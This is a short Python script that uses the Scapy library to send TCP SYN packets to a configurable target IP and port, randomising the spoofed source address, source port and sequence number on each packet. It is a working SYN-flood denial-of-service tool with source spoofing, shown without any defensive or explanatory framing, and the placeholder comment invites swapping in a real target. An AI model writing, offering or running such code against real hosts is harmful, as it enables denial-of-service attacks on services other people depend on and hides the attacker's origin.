from scapy.all import *
from ipaddress import *
import random

# Define target IP and port
target_ip = "127.0.0.1" # Replace with target
target_port = 80
num_syn_packets = 50
spacket = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
# Craft the SYN packet: IP Header / TCP Header (flags="S" for SYN)
for i in range(num_syn_packets):
    spacket[IP].src = str(IPv4Address(random.getrandbits(32)))
    spacket[TCP].sport = random.getrandbits(16)
    spacket[TCP].seq = random.getrandbits(32)
    send(spacket, verbose=0)
